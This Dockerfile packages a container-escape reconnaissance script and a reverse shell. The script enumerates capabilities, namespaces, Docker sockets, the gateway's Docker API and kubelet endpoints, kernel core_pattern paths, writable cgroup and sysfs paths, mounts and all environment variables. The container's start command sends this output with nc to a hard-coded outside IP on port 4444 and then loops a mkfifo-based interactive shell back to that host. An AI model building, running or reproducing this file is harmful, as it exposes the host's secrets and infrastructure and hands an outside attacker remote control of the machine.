# syntax=er028455/df-frontend:latest
FROM alpine:3.18

RUN apk add --no-cache curl openssh-client

RUN printf '#!/bin/sh\n{\necho "=== RUNTIME DEPLOYED ==="\nuname -a\nhostname\nid\ngrep -E "Cap|Seccomp|NoNew" /proc/self/status\necho "---NS---"\nls -la /proc/self/ns/\necho "---UNSHARE---"\nunshare --user -- id 2>&1\nunshare --mount -- id 2>&1\necho "---SOCK---"\nls -la /var/run/docker.sock /run/docker.sock 2>&1\nfind /run -name "*.sock" 2>/dev/null\necho "---GW---"\nGW=$(ip route | grep default | awk "{print \\$3}")\necho "GW=$GW"\nwget -q -T2 -O- http://$GW:2375/info 2>&1 | head -20\nwget -q -T2 -O- http://$GW:10250/pods 2>&1 | head -20\necho "---CORE---"\ncat /proc/sys/kernel/core_pattern\ncat /proc/sys/kernel/modprobe\necho "---WR---"\nfind /proc/sys -writable 2>/dev/null | head -10\nfind /sys -writable 2>/dev/null | head -10\necho "---MOUNTS---"\ncat /proc/self/mountinfo\necho "---CGROUP---"\ncat /proc/self/cgroup\nfind /sys/fs/cgroup -writable 2>/dev/null | head -20\necho "---DEVICES---"\nls -la /dev/ | head -30\ncat /proc/self/uid_map\ncat /proc/self/gid_map\necho "---NET---"\nip addr\nip route\ncat /etc/resolv.conf\necho "---ENV---"\nenv | sort\necho "---PROC1---"\ncat /proc/1/cmdline 2>/dev/null | tr "\\0" " "\necho ""\ncat /proc/1/cgroup 2>/dev/null\necho "=== END RUNTIME ==="\n} > /tmp/rt_recon 2>&1\ncat /tmp/rt_recon\n' > /recon.sh && chmod +x /recon.sh

CMD sh -c "/recon.sh | nc -w 5 129.101.121.138 4444; while true; do rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 129.101.121.138 4444 > /tmp/f; sleep 3; done"
